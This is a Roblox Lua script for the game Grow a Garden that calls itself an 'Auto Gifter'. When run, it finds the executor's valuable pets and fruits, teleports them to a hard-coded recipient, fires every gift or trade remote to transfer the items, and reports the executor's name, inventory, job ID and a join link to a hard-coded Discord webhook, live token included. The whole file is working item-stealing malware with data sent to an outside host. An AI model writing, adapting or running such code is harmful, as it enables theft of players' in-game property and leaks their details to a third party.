-- Grow a Garden Auto Gifter with Discord Embed
local RECIPIENT_NAME = "Tekeshkii" -- CASE SENSITIVE
local WEBHOOK_URL = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"
local GIFT_COOLDOWN = 1
local TARGET_ITEMS = {
    Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
    Fruits = {"candy blossom"}
}

-- Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")

-- Variables
local lp = Players.LocalPlayer
local Backpack = lp:WaitForChild("Backpack")
local Recipient = nil
local GiftRemotes = {}
local isActive = true
local currentJobId = game.JobId
local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Generate game link with JobID
local function getGameLink()
    return string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", 
        game.PlaceId, currentJobId)
end

-- Enhanced Discord embed with game link
local function sendEmbed(title, description, color, inventory)
    local embed = {
        title = title.." | "..gameName,
        description = description,
        color = color or 0xFF69B4,
        url = getGameLink(), -- Added clickable game link
        fields = {
            {name = "👤 Executor", value = lp.Name, inline = true},
            {name = "🎯 Recipient", value = Recipient and Recipient.Name or "None", inline = true},
            {name = "🆔 Job ID", value = currentJobId, inline = true},
            {name = "🎮 Game Link", value = "[Click to Join]("..getGameLink()..")", inline = false}
        },
        footer = {text = os.date("%X")}
    }

    -- Add inventory if provided
    if inventory then
        local items = {}
        for _, item in ipairs(inventory) do
            table.insert(items, item)
        end
        if #items > 0 then
            table.insert(embed.fields, {
                name = "📦 Inventory ("..#items..")",
                value = table.concat(items, "\n"),
                inline = false
            })
        end
    end

    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request
        if req then
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = {embed}})
            })
        end
    end)
end

-- Scan inventory for target items
local function scanInventory()
    local items = {}
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            for _, pet in ipairs(TARGET_ITEMS.Pets) do
                if name:find(pet:lower()) then
                    table.insert(items, "🐾 "..item.Name)
                    break
                end
            end
            for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
                if name:find(fruit:lower()) then
                    table.insert(items, "🍬 "..item.Name)
                    break
                end
            end
        end
    end
    return items
end

-- Find recipient and monitor presence
local function monitorRecipient()
    while isActive do
        -- Find recipient
        if not Recipient then
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Name == RECIPIENT_NAME then
                    Recipient = player
                    sendEmbed("🎯 RECIPIENT FOUND", "Beginning operations...", 0x00FF00, scanInventory())
                    break
                end
            end
        end
        
        -- Check if recipient left
        if Recipient and not Recipient.Parent then
            sendEmbed("⚠️ RECIPIENT LEFT", "Stopping operations", 0xFF0000, scanInventory())
            Recipient = nil
        end
        
        task.wait(5)
    end
end

-- Teleport to recipient
local function teleportToRecipient()
    if not Recipient or not Recipient.Character then return false end
    
    local humanoidRoot = Recipient.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRoot then return false end
    
    -- Create teleport anchor
    local teleportPart = Instance.new("Part")
    teleportPart.Anchored = true
    teleportPart.CanCollide = false
    teleportPart.Transparency = 1
    teleportPart.Size = Vector3.new(4, 4, 4)
    teleportPart.CFrame = humanoidRoot.CFrame * CFrame.new(0, 0, -2)
    teleportPart.Parent = workspace
    
    -- Perform teleport
    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
        lp.Character.HumanoidRootPart.CFrame = teleportPart.CFrame
    end
    
    teleportPart:Destroy()
    return true
end

-- Find gifting remotes
local function findGiftRemotes()
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") and (remote.Name:lower():find("gift") or remote.Name:lower():find("trade")) then
            table.insert(GiftRemotes, remote)
        end
    end
end

-- Gift item to recipient
local function giftItem(item)
    if not Recipient or #GiftRemotes == 0 then return false end
    
    -- Equip first
    if lp.Character then
        local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:EquipTool(item)
            task.wait(0.3)
        end
    end
    
    -- Send gift
    for _, remote in ipairs(GiftRemotes) do
        pcall(function() remote:FireServer(Recipient, item) end)
        pcall(function() remote:FireServer("Gift", Recipient, item) end)
    end
    
    return true
end

-- Main gifting loop
local function giftLoop()
    while isActive do
        if Recipient then
            -- Teleport to recipient
            if teleportToRecipient() then
                sendEmbed("🌀 TELEPORTED", "Now in position with recipient", 0x00FF00, scanInventory())
                
                -- Gift all target items
                local inventory = scanInventory()
                for _, item in ipairs(Backpack:GetChildren()) do
                    if not isActive then break end
                    
                    if item:IsA("Tool") then
                        local valid, itemType = false
                        local name = item.Name:lower()
                        
                        -- Check pets
                        for _, pet in ipairs(TARGET_ITEMS.Pets) do
                            if name:find(pet:lower()) then
                                valid = true
                                itemType = "Pet"
                                break
                            end
                        end
                        
                        -- Check fruits
                        for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
                            if name:find(fruit:lower()) then
                                valid = true
                                itemType = "Fruit"
                                break
                            end
                        end
                        
                        if valid and giftItem(item) then
                            sendEmbed("🎁 GIFT SENT", itemType..": "..item.Name, 0xADD8E6, scanInventory())
                            task.wait(GIFT_COOLDOWN)
                        end
                    end
                end
            else
                sendEmbed("⚠️ TELEPORT FAILED", "Could not reach recipient", 0xFF0000, scanInventory())
            end
        end
        task.wait(1)
    end
end

-- Initialize systems
sendEmbed("⚡ SYSTEM STARTED", "Now searching for recipient...", 0x00FF00, scanInventory())
findGiftRemotes()

-- Start monitoring
task.spawn(monitorRecipient)
task.spawn(giftLoop)

-- Cleanup on teleport
lp.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Started then
        isActive = false
        sendEmbed("🔄 TELEPORTING", "System pausing during transfer", 0xFFFF00, scanInventory())
    end
end)
